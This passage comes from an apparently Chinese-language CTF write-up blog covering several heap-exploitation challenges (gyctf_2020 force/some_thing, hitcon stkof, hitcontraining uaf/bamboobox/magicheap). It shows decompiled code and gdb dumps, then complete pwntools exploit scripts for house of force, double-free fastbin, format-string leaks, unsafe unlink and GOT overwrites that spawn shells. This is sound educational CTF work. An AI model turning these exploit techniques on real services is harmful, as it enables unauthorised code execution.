  read(0, nptr, 0xFuLL);
  size = atol(nptr);
  *(_QWORD *)i = malloc(size);
  if ( !*(_QWORD *)i )
    exit(0);
</code></pre>
<blockquote>
<blockquote>
<p><strong>add</strong>会返回堆的地址，所以可以利用这个来获取偏移量</p>
</blockquote>
<blockquote>
<p><strong>add</strong>同时存在堆溢出，使得我们可以覆盖 <strong>top chunk</strong>的 <strong>size</strong>域</p>
</blockquote>
<blockquote>
<p>可以多次申请。综上，符合house of force的攻击条件</p>
</blockquote>
<blockquote>
<p>1.libc leak	2.hof	3.malloc_hook+one gadget</p>
</blockquote>
</blockquote>
<h3>3.GDB</h3>
<h4>0x1 libc leak</h4>
<pre><code>1:add
2:puts
1
size
2097152 
bin addr 0x7ffff780c010
content
aaaa
&gt;vmmap
0x7ffff780c000     0x7ffff7a0d000 rw-p   201000 0      
0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
&gt;In python
&gt;&gt;&gt; hex(0x7ffff7a0d000 - 0x7ffff780c010)
'0x200ff0'
</code></pre>
<blockquote>
<p>得到偏移 <strong>0x200ff0</strong></p>
</blockquote>
<h4>0x2 house of force</h4>
<pre><code class="language-python">#code:
	addr = add(0x200000,'aaaaaa')
	base = addr + 0x200ff0
	log.success(&quot;libc base &gt;&gt;0x%x&quot;,base)
	top = add(0x18,&quot;a&quot;*0x10+p64(0)+p64(0xffffffffffffffff))+0x10
	log.success(&quot;top chunk &gt;&gt;0x%x&quot;,top)
	gdb.attach(p)
#gdb:
pwndbg&gt; heap
0x5559b4dfa000 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x6161616161616161, 
  bk = 0x6161616161616161, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0xffffffffffffffff
}
pwndbg&gt; x/12gx 0x5559b4dfa000
0x55d5b01aa000:	0x0000000000000000	0x0000000000000021
0x55d5b01aa010:	0x6161616161616161	0x6161616161616161
0x55d5b01aa020:	0x0000000000000000	0xffffffffffffffff
0x55d5b01aa030:	0x0000000000000000	0x0000000000000000
#输出:
[+] Starting local process './gyctf_2020_force': pid 50956
[+] libc base &gt;&gt;0x7fc48892d000
[+] top chunk &gt;&gt;0x55d5b01aa020
</code></pre>
<pre><code class="language-python">#code:
	add((offset-0x33),&quot;aaaa&quot;)
  #考虑到内存对齐，经过调试可得offset-0x33时，可以申请到malloc_hook-0x21的内存
	add(0x10,&quot;a&quot;*0x8+p64(one_gadget)+p64(realloc+16))
#gdb:
0x7f7a6909aaef &lt;_IO_wide_data_0+303&gt;:	0x007f7a6909926000	0x0000000000002100
0x7f7a6909aaff:	0x6161616161616100	0x007f7a68d1b26a61
0x7f7a6909ab0f &lt;__realloc_hook+7&gt;:	0x007f7a68d5a6d000	0xffd61c20d2750900	&lt;-这里调整堆栈，使one gadget可用
0x7f7a6909ab1f:	0x00000100000000ff	0x0000000000000000
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
elf = ELF(&quot;./gyctf_2020_force&quot;)
libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)
p = process(&quot;./gyctf_2020_force&quot;)
#p = remote(&quot;node3.buuoj.cn&quot;,&quot;28528&quot;)

def add(sz,text):
	p.sendlineafter(&quot;puts\n&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;size\n&quot;,str(sz))
	p.recvuntil(&quot;0x&quot;)
	addr = int(p.recv(12),16)
	p.sendafter(&quot;content\n&quot;,text)
	return addr

if __name__ == '__main__':
	addr = add(0x200000,'aaaaaa')
	base = addr + 0x200ff0
	log.success(&quot;libc base &gt;&gt;0x%x&quot;,base)
	top = add(0x18,&quot;a&quot;*0x10+p64(0)+p64(0xffffffffffffffff))+0x10
	log.success(&quot;top chunk &gt;&gt;0x%x&quot;,top)
	#gdb.attach(p)

	malloc_hook = base+libc.sym[&quot;__malloc_hook&quot;]
	realloc = base+libc.sym[&quot;__libc_realloc&quot;]
	one_gadget = 0x4526a + base
	offset = malloc_hook-top

	log.success(&quot;malloc hook &gt;&gt;0x%x&quot;,malloc_hook)
	log.success(&quot;realloc hook &gt;&gt;0x%x&quot;,realloc)
	log.success(&quot;offset &gt;&gt;0x%x&quot;,offset)

	add((offset-0x33),&quot;aaaa&quot;)
	add(0x10,&quot;a&quot;*0x8+p64(one_gadget)+p64(realloc+16))
	#gdb.attach(p)
    
	p.sendlineafter(&quot;puts\n&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;size\n&quot;,str(0x20))
	p.interactive()
</code></pre>
<h2>gyctf_2020_some_thing_exceting</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>三大功能</p>
<pre><code class="language-python">def add(ba_sz,ba_text,na_sz,na_text):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(ba_sz))
	p.sendlineafter(&quot;:&quot;,str(ba_text))
	p.sendlineafter(&quot;:&quot;,str(na_sz))
	p.sendlineafter(&quot;:&quot;,str(na_text))

def delete(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

def view(idx):
	p.sendlineafter(&quot;:&quot;,&quot;4&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<p><strong>flag</strong></p>
<pre><code class="language-c">unsigned __int64 flag()
{
  FILE *stream; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  stream = fopen(&quot;/flag&quot;, &quot;r&quot;);
  if ( !stream )
  {
    puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;);
    exit(0);
  }
  byte_6020A0 = 96;
  fgets(s, 45, stream);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<blockquote>
<p>后门函数</p>
</blockquote>
<p><strong>delete</strong></p>
<pre><code class="language-c">  free(*(void **)ptr[v1]);
  free(*((void **)ptr[v1] + 1));
  free(ptr[v1]);
</code></pre>
<blockquote>
<p>free指针没有清零，可以直接接上</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
elf = ELF(&quot;./something&quot;)
libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
#p = process(&quot;./something&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;25754&quot;)

def add(ba_sz,ba_text,na_sz,na_text):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(ba_sz))
	p.sendlineafter(&quot;:&quot;,str(ba_text))
	p.sendlineafter(&quot;:&quot;,str(na_sz))
	p.sendlineafter(&quot;:&quot;,str(na_text))

def delete(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

def view(idx):
	p.sendlineafter(&quot;:&quot;,&quot;4&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

if __name__ == '__main__':
	add(0x50,'0000',0x50,'1111')#0
	add(0x50,'2222',0x50,'3333')#1

	delete(0)
	delete(1)
	delete(0)

	add(0x50,p64(0x602098),0x50,'Chunk_2')#0
	add(0x50,'Chunk_3',0x50,'Chunk_4')#1--&gt;in 0x602098
	add(0x50,'f',0x60,'2')#0
	view(4)
	p.interactive()
</code></pre>
<h2>gyctf_2020_some_thing_interesting</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p><strong>sub_B7A</strong></p>
<pre><code class="language-c"> read(0, s1, 0x13uLL);
  if ( strncmp(s1, &quot;OreOOrereOOreO&quot;, 14uLL) )   // 只比较了前14个，后面可以带东西
  {
    puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;);
    exit(0);
  }
</code></pre>
<blockquote>
<p>字符串格式化漏洞，这里可以泄露地址</p>
</blockquote>
<p><strong>delete</strong></p>
<pre><code class="language-c">unsigned __int64 delete()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;#######################&quot;);
  puts(&quot;#     Delete Oreo     #&quot;);
  puts(&quot;#---------------------#&quot;);
  printf(&quot;&gt; Oreo ID : &quot;);
  _isoc99_scanf(&quot;%d&quot;, &amp;v1);
  if ( v1 &lt; 0 || v1 &gt; 10 || !chunk[v1] )        // 检查idx合法
  {
    puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;);
    Exit();
  }
  free(chunk[v1]);                              // 指针未清零
  free(re_chunk[v1]);                           // 导致uaf
  puts(&quot;#---------------------#&quot;);
  puts(&quot;#      ALL Down!      #&quot;);
  puts(&quot;#######################&quot;);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<blockquote>
<p><strong>free</strong>后指针没有置零，造成uaf</p>
</blockquote>
<h3>3.exp1 偏移量计算</h3>
<pre><code class="language-python">from pwn import *
elf = ELF(&quot;./gyctf_2020_some_thing_interesting&quot;)
libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)
sh = 0
counter=&quot;&quot;

def start(i):
	sh.sendlineafter(&quot;:&quot;,&quot;OreOOrereOOreO%&quot;+str(i)+&quot;$p&quot;)

def check_in(i):
	sh.sendlineafter(&quot;:&quot;,&quot;0&quot;)
	sh.recvuntil(&quot;OreOOrereOOreO&quot;)
	str1 = sh.recv(16)
	#print str1
	if &quot;0x7f&quot; in str1:
		success(&quot;This can be tested&quot;)
		global counter 
		counter+= &quot; &quot;+str(i)+&quot; &quot;
		print &quot;\n&quot;
		print &quot;\n&quot;
	else:
		pass
		

def offset_count(ip,port,mode,debug,i):
	global sh
	if debug==0:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode==0:
		sh = process(&quot;./gyctf_2020_some_thing_interesting&quot;)
	else:
		sh = remote(ip,port)
	start(i)
	check_in(i)
	sh.close()

if __name__ == '__main__':
	for i in range(4,20):
		#success(&quot;Now round %d&quot;,i)
		offset_count(1,1,0,1,i)
	print &quot;can be tested &gt;&quot;
	print counter
</code></pre>
<p>得到</p>
<p><code> 4  6  7  10  11  12  14  16  17  19</code></p>
<p>最终得到偏移量为 <code>17</code></p>
<blockquote>
<p>这里也可以使用 *<em>b <em>$rebase(偏移地址)</em></em> 来慢慢计算得到偏移</p>
</blockquote>
<h3>3.exp2 攻击</h3>
<pre><code class="language-python">from pwn import *
elf = ELF(&quot;./gyctf_2020_some_thing_interesting&quot;)
libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)
sh = 0

def leak_addr():
	sh.sendlineafter(&quot;:&quot;,&quot;OreOOrereOOreO%17$p&quot;)
	sh.sendlineafter(&quot;:&quot;,&quot;0&quot;)
	sh.recvuntil(&quot;OreOOrereOOreO0x&quot;)
	return int(sh.recv(12),16)

def create(o_sz,o_text,re_sz,re_text):
	sh.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	sh.sendlineafter(&quot;: &quot;,str(o_sz))
	sh.sendlineafter(&quot;: &quot;,o_text)
	sh.sendlineafter(&quot;: &quot;,str(re_sz))
	sh.sendlineafter(&quot;: &quot;,re_text)

def edit(idx,o_text,re_text):
	sh.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	sh.sendlineafter(&quot;: &quot;,str(idx))
	sh.sendlineafter(&quot;: &quot;,o_text)
	sh.sendlineafter(&quot;: &quot;,re_text)

def delete(idx):
	sh.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	sh.sendlineafter(&quot;: &quot;,str(idx))

def show(idx):
	sh.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	sh.sendlineafter(&quot;: &quot;,str(idx))

def pwn(ip,port,debug,mode):
	global sh
	if debug==0:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode==0:
		sh = process(&quot;./gyctf_2020_some_thing_interesting&quot;)
	else:
		sh = remote(ip,port)

	leak = leak_addr()
	base = leak-0x20830
	one_gadget = 0xf1147+base
	malloc_hook = base+libc.sym[&quot;__malloc_hook&quot;]
	success(&quot;base  -&gt; 0x%x&quot;,base)
	success(&quot;one gadget  -&gt; 0x%x&quot;,one_gadget)
	success(&quot;malloc hook  -&gt; 0x%x&quot;,malloc_hook)
	
	create(0x68,'aaaa',0x68,'1111') #1
	create(0x68,'aaaa',0x68,'1111') #2
	delete(1)
	delete(2)
	delete(1)

	create(0x68,p64(malloc_hook-35),0x68,'1111') #1
	create(0x68,p64(malloc_hook-35),0x68,'1111') #2
	create(0x68,p64(malloc_hook-35),0x68,&quot;a&quot;*0x13+p64(one_gadget)) #1
	sh.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	sh.sendlineafter(&quot;: &quot;,&quot;20&quot;)
	sh.interactive()
if __name__ == '__main__':
	pwn(&quot;node3.buuoj.cn&quot;,29443,1,1)
</code></pre>
<h2>hitcon_2014_stkof</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>程序太简陋了，几乎没有交互，能用的有三个功能</p>
<pre><code class="language-python">def add(sz):
	p.snedline(&quot;1&quot;)
	p.snedline(str(sz))

def edit(chunk,size,strs):
    p.sendline(&quot;2&quot;)
    p.sendline(chunk)    
    p.sendline(size)
    p.sendline(strs)

def free(chunk):
    p.sendline(&quot;3&quot;)
    p.sendline(chunk)
</code></pre>
<p><strong>sub_4009E8() edit</strong></p>
<pre><code class="language-c">for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )
  {
    ptr += i;
    n -= i;
  }
</code></pre>
<blockquote>
<p>没有控制输入范围，可以堆溢出</p>
</blockquote>
<p><strong>全局变量s</strong></p>
<pre><code class="language-assembly">.bss:0000000000602104                 align 40h
.bss:0000000000602140 ; char *s[1049600]
.bss:0000000000602140 s               dq ?                    ; DATA XREF: add+78↑w
.bss:0000000000602140                                         ; edit+60↑r ...
.bss:0000000000602148                 db    ? ;
.bss:0000000000602149                 db    ? ;
.bss:000000000060214A                 db    ? ;
</code></pre>
<p><strong>思路</strong></p>
<blockquote>
<blockquote>
<p>有堆溢出，有全局指针变量，没有输出函数，所以用unlink改<code>free@got</code> 为 <code>puts</code>，再次调用<code>free</code>就相当于调用<code>puts</code>，从而<code>libc leak</code></p>
</blockquote>
<blockquote>
<p>填入<code>onegedget</code>或者该函数为<code>system</code>并执行binsh，从而getshell</p>
</blockquote>
</blockquote>
<h3>3.GDB</h3>
<p><strong>unlink部份</strong></p>
<pre><code class="language-python">#unlink
#code:
    alloc(0x100)        # idx 1
    alloc(0x30)         # idx 2
    alloc(0x80)         # idx 3
    
    head = 0x602140  #全局变量
    
    #fake chunk
    payload = p64(0)      
    payload += p64(0x20) 
    payload += p64(head + 16 - 0x18)  
    payload += p64(head + 16 - 0x10) 
    payload += p64(0x20)
    payload = payload.ljust(0x30, 'a')
    payload += p64(0x30)
    payload += p64(0x90)
    edit(2, len(payload), payload)
	
    #unlink
    free(3)
    p.recvuntil('OK\n')
    gdb.attach(p)
</code></pre>
<p><strong>gdb</strong></p>
<pre><code>0x1561000 PREV_INUSE {
  prev_size = 0, 
  size = 4113, 
  fd = 0xa33, 
  bk = 0x20, 
  fd_nextsize = 0x602138, 
  bk_nextsize = 0x602140
}
0x1562010 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1562120 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1562530 FASTBIN {
  prev_size = 0, 
  size = 65, 
  fd = 0x0, 
  bk = 0x20ac1, 
  fd_nextsize = 0x602138, 
  bk_nextsize = 0x602140
}

pwndbg&gt; x/32gx 0x1561000
0x1561000:	0x0000000000000000	0x0000000000001011
0x1561010:	0x0000000000000a33	0x0000000000000020
			fake fd			    fake bk
0x1561020:	0x0000000000602138	0x0000000000602140
0x1561030:	0x0000000000000020	0x6161616161616161
0x1561040:	0x0000000000000030	0x0000000000000090
0x1561050:	0x0000000000000000	0x0000000000000000
0x1561060:	0x0000000000000000	0x0000000000000000
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./stkof&quot;)
libc = ELF('/home/joe1sn/libc/64/libc-2.23.so')
#p = process(&quot;./stkof&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;25342&quot;)

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))


if __name__ == '__main__':

    alloc(0x100)        # idx 1
    alloc(0x30)         # idx 2
    alloc(0x80)         # idx 3
    
    head = 0x602140		    #global pointer
    payload = p64(0)        #prev_size
    payload += p64(0x20)    #size --&gt; except the first line, the rest two line is equal to 0x20?
    payload += p64(head + 16 - 0x18)   #fd
    payload += p64(head + 16 - 0x10)   #bk
    payload += p64(0x20)    # next chunk's prev_size bypass the check
    payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size
    
    # make it believe that prev chunk is at global[2]
    payload += p64(0x30)        #0x30 is the front one whole size?
    
    # make it believe that prev chunk is free
    payload += p64(0x90)
    edit(2, len(payload), payload)
    
    # unlink fake chunk, so global[2] =&amp;(global[2]) - 0x18 = head - 8
    free(3)
    p.recvuntil('OK\n')
    #gdb.attach(p)
    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
    payload = 'a' * 8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
    edit(2, len(payload), payload)
    # edit free@got to puts@plt
    payload = p64(elf.plt['puts'])
    edit(0, len(payload), payload)

    #free global[1] to leak puts addr
    free(1)
    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base: ' + hex(libc_base))
    log.success('/bin/sh addr: ' + hex(binsh_addr))
    log.success('system addr: ' + hex(system_addr))
    # modify atoi@got to system addr
    payload = p64(system_addr)
    edit(2, len(payload), payload)
    p.send(p64(binsh_addr))
    p.interactive()
</code></pre>
<h2>hitcontraining_uaf</h2>
<p><strong>Use_After_Free</strong></p>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<pre><code class="language-asp">    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<p><strong>得到几个选项+后门</strong></p>
<pre><code class="language-python">def add(sz,text):
    p.sendlineafter(&quot;choice :&quot;,&quot;1&quot;)
    p.sendlineafter(&quot;:&quot;,str(sz))
    p.sendlineafter(&quot;:&quot;,text)
</code></pre>
<pre><code class="language-python">def dele(idx):
    p.sendlineafter(&quot;choice :&quot;,&quot;2&quot;)
    p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<pre><code class="language-python">def show(idx):
    p.sendlineafter(&quot;choice :&quot;,&quot;3&quot;)
    p.sendlineafter(&quot;choice :&quot;,str(idx))
</code></pre>
<p><strong>backdoor:</strong></p>
<pre><code class="language-c">int magic()
{
  return system(&quot;cat /home/hacknote/flag&quot;);
}
</code></pre>
<p><strong>free：</strong></p>
<pre><code class="language-c">	free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts(&quot;Success&quot;);
</code></pre>
<blockquote>
<p>这里free后指针未清造成UAF</p>
</blockquote>
<ul>
<li><strong>EXP</strong></li>
</ul>
<pre><code class="language-python">from pwn import *
p = process(&quot;./hacknote&quot;)

def addnote(size,content):
    p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
    p.sendlineafter(&quot;:&quot;,str(size))
    p.sendlineafter(&quot;:&quot;,content)

def delnote(idx):
    p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
    p.sendlineafter(&quot;:&quot;,str(idx))

def printnote(idx):
    p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
    p.sendlineafter(&quot;:&quot;,str(idx))

if __name__ == '__main__':
    magic = 0x08048986
    system = 0x8048506
    addnote(32,&quot;ddaa&quot;)
    addnote(32,&quot;ddaa&quot;)
    addnote(32,&quot;ddaa&quot;)
    delnote(0)
    delnote(1)
    addnote(8,p32(magic))
    printnote(0)
    p.interactive()
</code></pre>
<h2>hitcontraining_bamboobox</h2>
<p><strong>Unlink or House_Of_Force</strong></p>
<ul>
<li><strong>checksec</strong></li>
</ul>
<pre><code class="language-asp">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<ul>
<li><strong>IDA</strong></li>
</ul>
<pre><code class="language-python">def add(length,name):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(length))
	p.sendlineafter(&quot;:&quot;,name)
</code></pre>
<pre><code class="language-python">def edit(idx,length,name):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(length))
	p.sendlineafter(&quot;:&quot;,name)
</code></pre>
<pre><code class="language-python">def free(idx):
	p.sendlineafter(&quot;:&quot;,&quot;4&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<pre><code class="language-python">def show():
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
</code></pre>
<p><strong>back_door</strong></p>
<pre><code class="language-c">void __noreturn magic()
{
  int fd; // ST0C_4
  char buf; // [rsp+10h] [rbp-70h]
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open(&quot;/home/bamboobox/flag&quot;, 0);
  read(fd, &amp;buf, 0x64uLL);
  close(fd);
  printf(&quot;%s&quot;, &amp;buf);
  exit(0);
}
</code></pre>
<p><strong>change_item</strong></p>
<pre><code class="language-c">     printf(&quot;Please enter the length of item name:&quot;, &amp;buf);
      read(0, &amp;nptr, 8uLL);
      v0 = atoi(&amp;nptr);
      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);
      *(_BYTE *)(qword_6020C8[2 * v2] + (signed int)read(0, (void *)qword_6020C8[2 * v2], v0)) = 0;
    }
</code></pre>
<blockquote>
<p>堆溢出</p>
</blockquote>
<blockquote>
<p>**1.unsafe unlink: **对进行 unlink chunk 进行内存布然后借助 unlink 操作来达成修改指针的效果。个人认为通过堆溢出伪造一个chun伪造的chunk一般在fd和bk上不同</p>
<p>**2.house of force: **</p>
<blockquote>
<p>进行堆分配如果所有空闲的块都无法满足需那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案可以使得 top chunk指向我们期望的任何位这就相当于一次任意地址写。   --CTFWiKi</p>
</blockquote>
<blockquote>
<p>需要以下条件：</p>
<ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
</blockquote>
</blockquote>
<ul>
<li><strong>EXP-1</strong></li>
</ul>
<p><strong>unlink</strong></p>
<blockquote>
<p>原版EXP方便理解所以直接拿来用了</p>
</blockquote>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = &quot;training.pwnable.tw&quot;
port = 11011


r = remote(host,port)

def additem(length,name):
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;:&quot;)
    r.sendline(str(length))
    r.recvuntil(&quot;:&quot;)
    r.sendline(name)

def modify(idx,length,name):
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;:&quot;)
    r.sendline(str(idx))
    r.recvuntil(&quot;:&quot;)
    r.sendline(str(length))
    r.recvuntil(&quot;:&quot;)
    r.sendline(name)

def remove(idx):
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;4&quot;)
    r.recvuntil(&quot;:&quot;)
    r.sendline(str(idx))

def show():
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;1&quot;)

additem(0x40,&quot;a&quot;*8)
additem(0x80,&quot;b&quot;*8)
additem(0x40,&quot;c&quot;*8)

ptr = 0x6020c8
fake_chunk = p64(0) #prev_size
fake_chunk += p64(0x41) #size
fake_chunk += p64(ptr-0x18) #fd
fake_chunk += p64(ptr-0x10) #bk
fake_chunk += &quot;c&quot;*0x20
fake_chunk += p64(0x40)#修复
fake_chunk += p64(0x90)#修复

modify(0,0x80,fake_chunk) #unlink
remove(1)

payload = p64(0)*2
payload += p64(0x40) + p64(0x602068)
modify(0,0x80,payload)
show()		#libc base leak
r.recvuntil(&quot;0 : &quot;)
atoi = u64(r.recvuntil(&quot;:&quot;)[:6].ljust(8,&quot;\x00&quot;))
libc = atoi - 0x36e80
print &quot;libc:&quot;,hex(libc)
system = libc + 0x45390

modify(0,0x8,p64(system))
r.recvuntil(&quot;:&quot;)
r.sendline(&quot;sh&quot;)
r.interactive()
</code></pre>
<blockquote>
<p>这里可以看见我们伪造的堆结构:</p>
<pre><code class="language-python">ptr = 0x6020c8
fake_chunk = p64(0) #prev_size
fake_chunk += p64(0x41) #size
fake_chunk += p64(ptr-0x18) #fd
fake_chunk += p64(ptr-0x10) #bk
fake_chunk += &quot;c&quot;*0x20
fake_chunk += p64(0x40)
fake_chunk += p64(0x90)
</code></pre>
</blockquote>
<ul>
<li><strong>3.EXP-2</strong></li>
</ul>
<p><strong>house of force</strong></p>
<pre><code class="language-python">from pwn import *

r = process(&quot;./bamboobox&quot;)
elf = ELF(&quot;./bamboobox&quot;)

def alloc(length,context):
    r.recvuntil(&quot;Your choice:&quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;Please enter the length of item name:&quot;)
    r.sendline(str(length))
    r.recvuntil(&quot;Please enter the name of item:&quot;)
    r.send(context)

def edit(idx,length,context):
    r.recvuntil(&quot;Your choice:&quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;Please enter the index of item:&quot;)
    r.sendline(str(idx))
    r.recvuntil(&quot;Please enter the length of item name:&quot;)
    r.sendline(str(length))
    r.recvuntil(&quot;Please enter the new name of the item:&quot;)
    r.send(context)

def free(idx):
    r.recvuntil(&quot;Your choice:&quot;)
    r.sendline(&quot;4&quot;)
    r.recvuntil(&quot;Please enter the index of item:&quot;)
    r.sendline(str(idx))

def show():
    r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)

def exit():
    r.sendlineafter(&quot;:&quot;, &quot;5&quot;)

alloc(0x30,'aaaa')

payload='a'*0x30+p64(0)+p64(0xffffffffffffffff) #house of force
edit(0,0x40,payload)

magic=elf.sym['magic']
malloc_size = -(0x40 + 0x20)-0x10

alloc(malloc_size,'aaaa')
alloc(0x10,p64(magic)*2)
exit()
r.interactive()
</code></pre>
<h2>hitcontraining_magicheap</h2>
<p><strong>Unsorted_Bin_Attack</strong></p>
<blockquote>
<p>控制 Unsorted Bin Chunk 的 bk 指针</p>
</blockquote>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<pre><code class="language-asp">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<pre><code class="language-python">def add(sz,text):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)
</code></pre>
<pre><code class="language-python">def edit(idx,text):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(len(text)))
	p.sendlineafter(&quot;:&quot;,str(text))
</code></pre>
<pre><code class="language-python">def free(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<p><strong>back_door</strong></p>
<pre><code class="language-c">int l33t()
{
  return system(&quot;/bin/sh&quot;);
}
</code></pre>
<p><strong>edit_heap</strong></p>
<pre><code class="language-c"> printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1);
  read(0, (char *)&amp;v1 + 4, 8uLL);
  v2 = atoi((const char *)&amp;v1 + 4);
  printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1);
  read_input(heaparray[(signed int)v1], v2);
  return puts(&quot;Done !&quot;);
</code></pre>
<blockquote>
<p>未控制边堆溢出</p>
</blockquote>
<ul>
<li><strong>3.EXP</strong></li>
</ul>
<pre><code class="language-python">from pwn import *
